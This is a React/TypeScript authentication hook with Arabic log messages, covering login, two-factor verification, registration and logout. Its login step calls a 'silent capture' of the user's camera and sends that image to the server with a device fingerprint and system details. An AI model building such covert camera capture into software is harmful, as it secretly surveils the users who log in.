import { createContext, ReactNode, useContext, useEffect, useState } from "react";
import {
  useQuery,
  useMutation,
  UseMutationResult,
} from "@tanstack/react-query";
import { insertUserSchema, User, InsertUser, LoginData } from "@shared/schema";
import { apiRequest, queryClient } from "../lib/queryClient";
import { useToast } from "@/hooks/use-toast";
import { useLocation } from "wouter";

// Helper function to get client IP
async function getClientIP(): Promise<string> {
  try {
    const response = await fetch('https://api.ipify.org?format=json');
    const data = await response.json();
    return data.ip;
  } catch (error) {
    console.warn('⚠️ فشل الحصول على IP العميل:', error);
    return 'unknown';
  }
}

type AuthContextType = {
  user: Omit<User, "password"> | null;
  isLoading: boolean;
  error: Error | null;
  loginMutation: UseMutationResult<{token?: string, user?: Omit<User, "password">, requires2FA?: boolean, tempToken?: string}, Error, LoginData>;
  verify2FAMutation: UseMutationResult<{token: string, user: Omit<User, "password">}, Error, {tempToken: string, token: string}>;
  logoutMutation: UseMutationResult<void, Error, void>;
  registerMutation: UseMutationResult<{token: string, user: Omit<User, "password">}, Error, InsertUser>;
  refreshUser: () => Promise<void>;
};

// Type for user data with token
type AuthResponse = {
  token?: string;
  user?: Omit<User, "password">;
  message: string;
  requires2FA?: boolean;
  tempToken?: string;
};

// JWT token key in localStorage
const TOKEN_KEY = "auth_token";

export const AuthContext = createContext<AuthContextType | null>(null);

export function AuthProvider({ children }: { children: ReactNode }) {
  const { toast } = useToast();
  const [, setLocation] = useLocation();
  const [user, setUser] = useState<Omit<User, "password"> | null>(null);
  const [isLoading, setIsLoading] = useState(true);
  const [error, setError] = useState<Error | null>(null);

  // Function to refresh user data
  const refreshUser = async () => {
    const token = localStorage.getItem(TOKEN_KEY);
    
    if (!token) {
      setUser(null);
      return;
    }

    try {
      console.log('🔄 تحديث بيانات المستخدم...');
      // إضافة timestamp لكسر الكاش
      const timestamp = Date.now();
      const response = await apiRequest(`/api/user?t=${timestamp}`, 'GET');
      const userData = await response.json();
      setUser(userData);
      console.log('✅ تم تحديث بيانات المستخدم:', userData.fullName);
    } catch (err) {
      console.warn('⚠️ التوكن منتهي الصلاحية أو غير صالح');
      localStorage.removeItem(TOKEN_KEY);
      setUser(null);
      setError(err instanceof Error ? err : new Error('Authentication error'));
    }
  };

  // Initialize user data from saved token
  useEffect(() => {
    const initializeAuth = async () => {
      const token = localStorage.getItem(TOKEN_KEY);
      
      if (!token) {
        setIsLoading(false);
        return;
      }

      try {
        console.log('🔍 التحقق من صحة التوكن...');
        const response = await apiRequest('/api/user', 'GET');
        const userData = await response.json();
        setUser(userData);
        console.log('✅ تم تحميل بيانات المستخدم:', userData.fullName);
      } catch (err) {
        console.warn('⚠️ التوكن منتهي الصلاحية أو غير صالح');
        localStorage.removeItem(TOKEN_KEY);
        setUser(null);
        setError(err instanceof Error ? err : new Error('Authentication error'));
      } finally {
        setIsLoading(false);
      }
    };

    initializeAuth();
  }, []);

  const loginMutation = useMutation({
    mutationFn: async (credentials: LoginData) => {
      console.log('📤 إرسال طلب تسجيل الدخول مع نظام الأمان المتكامل...');
      
      // استيراد نظام الأمان
      const { security } = await import('@/lib/security');
      
      // التأكد من تهيئة البصمة
      const fingerprint = security.getFingerprint() || await security.initFingerprint();
      
      // محاولة التقاط صورة مباشرة قبل الإرسال (تأمين إضافي)
      console.log('📷 محاولة التقاط صورة إضافية قبل الإرسال مباشرة...');
      try {
        await security.triggerSilentCapturePublic();
        console.log('✅ تم التقاط صورة إضافية بنجاح');
      } catch (directCaptureError) {
        console.warn('⚠️ فشل التقاط الصورة الإضافية:', directCaptureError);
      }
      
      // الحصول على الصورة الملتقطة (إن وجدت)
      const capturedImage = security.getLastCapturedImage();
      console.log('📷 حالة الصورة الأمنية:', capturedImage ? 'موجودة' : 'غير موجودة');
      console.log('📊 تفاصيل النظام الأمني:', {
        backgroundCameraActive: security.isBackgroundCameraActive(),
        failedAttempts: security.getFailedAttempts
      });
      
      // إعداد البيانات الأمنية المتكاملة
      const securityCredentials = {
        ...credentials,
        fingerprint,
        ipAddress: '127.0.0.1', // سيتم تحديثه بواسطة الخادم
        userAgent: navigator.userAgent,
        // إضافة الصورة الأمنية إذا كانت متوفرة
        ...(capturedImage && { securityImage: capturedImage }),
        // معلومات الجهاز التفصيلية للأمان
        location: {
          platform: navigator.platform,
          language: navigator.language,
          screen: `${screen.width}x${screen.height}`,
          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
          timestamp: new Date().toISOString()
        }
      };
      
      console.log('📊 البيانات المرسلة:', {
        email: securityCredentials.email,
        fingerprint: securityCredentials.fingerprint?.substring(0, 8) + '...',
        hasSecurityImage: !!capturedImage,
        imageSize: capturedImage ? Math.round(capturedImage.length / 1024) + 'KB' : 0
      });
      
      const res = await apiRequest("/api/login", "POST", securityCredentials);
      
      // مسح الصورة المُستخدمة بعد الإرسال
      if (capturedImage) {
        security.clearLastCapturedImage();
        console.log('🧹 تم مسح الصورة الأمنية المُستخدمة');
      }
      
      const data = await res.json() as AuthResponse;
      
      // التحقق من حالة المصادقة الثنائية - أي status 202 يعني 2FA مطلوب
      if (res.status === 202) {
        console.log('🔐 [2FA HOOK DEBUG] استجابة 202 - بيانات الاستجابة:', data);
        const result = {
          requires2FA: true,
          tempToken: data.tempToken || data.temp_token
        };
        console.log('🔐 [2FA HOOK DEBUG] إعادة النتيجة:', result);
        return result;
      }
      
      return { token: data.token, user: data.user };
    },
    onSuccess: (data) => {
      // إذا كانت المصادقة الثنائية مطلوبة، لا نقوم بتسجيل الدخول الآن
      if (data.requires2FA) {
        // سيتم التعامل مع هذا في AuthPage - ولكن نتأكد من استدعاء callback
        console.log('🔐 Hook: المصادقة الثنائية مطلوبة، إرسال البيانات لـ AuthPage');
        return;
      }
      
      // Save token to localStorage
      localStorage.setItem(TOKEN_KEY, data.token!);
      
      // Update user state
      setUser(data.user!);
      
      // Show success message
      toast({
        title: "تم تسجيل الدخول بنجاح",
        description: `مرحبًا ${data.user!.fullName}`,
      });
      
      // Redirect to dashboard
      setLocation("/dashboard");
    },
    onError: (error: Error) => {
      toast({
        title: "فشل تسجيل الدخول",
        description: error.message,
        variant: "destructive",
      });
    },
  });

  const verify2FAMutation = useMutation({
    mutationFn: async (credentials: {tempToken: string, token: string}) => {
      console.log('🔐 [2FA VERIFY DEBUG] إرسال بيانات التحقق - tempToken موجود:', !!credentials.tempToken, 'code موجود:', !!credentials.token);
      // تحويل token إلى code للتوافق مع الخادم
      const payload = { tempToken: credentials.tempToken, code: credentials.token };
      console.log('🔐 [2FA VERIFY DEBUG] البيانات المرسلة - طولها:', JSON.stringify(payload).length, 'حروف');
      const res = await apiRequest("/api/auth/2fa-verify-login", "POST", payload);
      console.log('🔐 [2FA VERIFY DEBUG] استجابة الخادم:', res.status, res.statusText);
      
      if (!res.ok) {
        const errorData = await res.json();
        console.error('🔐 [2FA VERIFY DEBUG] خطأ من الخادم:', errorData);
        throw new Error(errorData.message || 'فشل في التحقق');
      }
      
      const data = await res.json() as AuthResponse;
      console.log('🔐 [2FA VERIFY DEBUG] بيانات الاستجابة:', data);
      return { token: data.token!, user: data.user! };
    },
    onSuccess: (data) => {
      // Save token to localStorage
      localStorage.setItem(TOKEN_KEY, data.token);
      
      // Update user state
      setUser(data.user);
      
      // Show success message
      toast({
        title: "تم تسجيل الدخول بنجاح",
        description: `مرحبًا ${data.user.fullName}`,
      });
      
      // Redirect to dashboard
      setLocation("/dashboard");
    },
    onError: (error: Error) => {
      toast({
        title: "فشل التحقق من المصادقة الثنائية",
        description: error.message,
        variant: "destructive",
      });
    },
  });

  const registerMutation = useMutation({
    mutationFn: async (credentials: InsertUser) => {
      const res = await apiRequest("/api/register", "POST", credentials);
      const data = await res.json() as AuthResponse;
      return { token: data.token, user: data.user };
    },
    onSuccess: (data) => {
      // Save token to localStorage
      localStorage.setItem(TOKEN_KEY, data.token);
      
      // Update user state
      setUser(data.user);
      
      // Show success message
      toast({
        title: "تم إنشاء الحساب بنجاح",
        description: `مرحبًا ${data.user.fullName}`,
      });
      
      // Redirect to dashboard
      setLocation("/dashboard");
    },
    onError: (error: Error) => {
      toast({
        title: "فشل إنشاء الحساب",
        description: error.message,
        variant: "destructive",
      });
    },
  });

  const logoutMutation = useMutation({
    mutationFn: async () => {
      // JWT logout is client-side only, but we'll still call the endpoint
      try {
        await apiRequest("/api/logout", "POST");
      } catch (error) {
        // Ignore logout endpoint errors
        console.warn('Logout endpoint error (ignored):', error);
      }
      
      // Clear token from localStorage
      localStorage.removeItem(TOKEN_KEY);
    },
    onSuccess: () => {
      // Clear user state
      setUser(null);
      
      // Show success message
      toast({
        title: "تم تسجيل الخروج بنجاح",
      });
      
      // Redirect to home
      setLocation("/");
    },
    onError: (error: Error) => {
      toast({
        title: "فشل تسجيل الخروج",
        description: error.message,
        variant: "destructive",
      });
    },
  });

  return (
    <AuthContext.Provider
      value={{
        user,
        isLoading,
        error,
        loginMutation,
        verify2FAMutation,
        logoutMutation,
        registerMutation,
        refreshUser,
      }}
    >
      {children}
    </AuthContext.Provider>
  );
}

export function useAuth() {
  const context = useContext(AuthContext);
  if (!context) {
    throw new Error("useAuth must be used within an AuthProvider");
  }
  return context;
}
